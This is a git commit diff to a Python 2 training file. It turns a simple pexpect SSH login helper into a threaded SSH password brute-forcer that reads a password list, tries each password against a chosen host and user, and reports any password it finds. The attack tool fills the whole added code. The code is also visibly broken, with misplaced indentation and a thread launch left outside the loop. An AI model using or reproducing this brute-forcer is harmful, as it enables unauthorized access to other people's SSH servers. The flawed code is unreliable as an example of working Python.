45abab01a692d71e3eb1a647cbca0f21c0031815
JimmyLee05 <NanJun05@163.com>
2016-10-28 14:19:17 +0800

    add some details

--- PythonTraining/Pexpect.py
+++ PythonTraining/Pexpect.py
@@ -1,33 +1,90 @@
-import pexpect
+import pxssh
+import optparse
+import time
+from threading import *
 
-PROMPT = ['# ', '>>> ', '> ', '\$ ']
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
 
-def send_command(child, cmd):
+def connect(host, user, password, release):
 
-	child.sendline(cmd)
-	child.expect(PROMPT)
-	print child.before
+	global Found
+	global Fails
 
-def connect(user, host, password):
+	try:
+		s = pxssh.pxssh()
+		s.login(host, user, password)
+		print '[+] Password Found: ' + password
 
-	ssh_newkey = 'Are you sure you want to continue connecting'
-	connStr = 'ssh' + user + '@' + host
-	child = pexpect.spawn(connStr)
-	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, \
-		'[P|p]assword:'])
+	Found = True
 
-	if ret == 0:
-		print '[-] Error Connecting'
-		return
+	except Exception, e:
 
-	if ret == 1:
-		child.sendline('yes')
-		ret = child.expect([pexpect.TIMEOUT, \
-			'[P|p]assword:'])
+		if 'read_nonblocking' in str(e):
+			Fails += 1
+				time.sleep(5)
+				connect(host, user, password, False)
 
-	if ret == 0:
-		print '[-] Error Connecting'
-		return
-	child.sendline(password)
-	child.expect(PROMPT)
-	return child
+		elif 'synchronize with original prompt' in str(e):
+			time.sleep(1)
+			connect(host, user, password, False)
+
+		finally:
+
+			if release: connection_lock.release()
+
+def main():
+
+	parser = optparse.OptionParser('usage%prog '+\
+		'-H <target host> -u <user> -F <password list>')
+
+	parser.add_option('-H', dest='tgtHost', type='string', \
+		help='specify target host')
+
+	parser.add_option('-F', dest='passwdFile', type='string', \
+		help='specify password file')
+
+	parser.add_option('-u', dest='user', type='string', \
+		help='specify the user')
+	
+	(options, args) = parser.parse_args()
+
+	host = options.tgtHost
+	passwdFile = options.passwdFile
+	user = options.user
+
+	if host == None or passwdFile == None or user ==None:
+		print parser.usage
+		exit(0)
+
+	user = options.user
+	fn = open(passwdFile, 'r')
+	user = options.user
+
+	for line in fn.readlines():
+
+		user = options.user
+
+		if Found:
+			print "[*] Exiting: Password Found"
+			exit(0)
+
+			if Fails > 5:
+				print "[!] Exiting: Too Many Socket Timeouts"
+				exit(0)
+
+	connection_lock.acquire()
+	password = line.strip('\r').strip('\n')
+	print "[-] Testing: "+str(password)
+
+	t = Thread(target=connect, args=(host, user, \
+		password, True))
+	child = t.start()
+
+if __name__ == '__main__':
+	main()
+
+
+
